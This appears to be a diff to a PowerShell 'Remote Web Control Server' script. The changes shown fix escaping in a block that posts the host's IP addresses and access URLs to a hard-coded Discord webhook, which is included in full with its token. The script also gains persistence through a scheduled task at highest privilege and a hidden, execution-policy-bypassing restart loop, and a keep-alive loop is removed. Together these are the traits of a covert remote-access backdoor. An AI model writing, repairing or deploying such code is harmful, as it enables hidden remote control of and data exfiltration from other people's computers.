@@ -1,4 +1,4 @@
-# Remote Web Control Server
+# Remote Web Control Server - Fixed Version
 $webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
@@ -28,8 +28,8 @@ $ips += "127.0.0.1"
 
 # Send IP info to Discord
 try {
-    $ipList = $ips -join "\n"
-    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
+    $ipList = $ips -join "`n"
+    $body = @{content="Web server started! Access URLs:`n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 } catch {
     # If Discord fails, continue anyway
@@ -308,15 +308,6 @@ while ($true) {
         Register-ScheduledTask -TaskName "WebRemoteRestarter" -Action $action -Trigger $trigger -RunLevel Highest -Force
     } catch {
         # Fallback: create simple restart loop
-    Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command `"while (`$true) { Start-Sleep -Seconds 10; try { Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File `"$scriptPath`"" } catch { Start-Sleep -Seconds 5 } }`""
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command `"while (`$true) { Start-Sleep -Seconds 10; try { Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File `"$scriptPath`"" } catch { Start-Sleep -Seconds 5 } }`""
     }
-}
-
-# Keep server running indefinitely
-try {
-    while ($true) {
-        Start-Sleep -Seconds 1
-    }
-} catch {
-    $listener.Stop()
 }
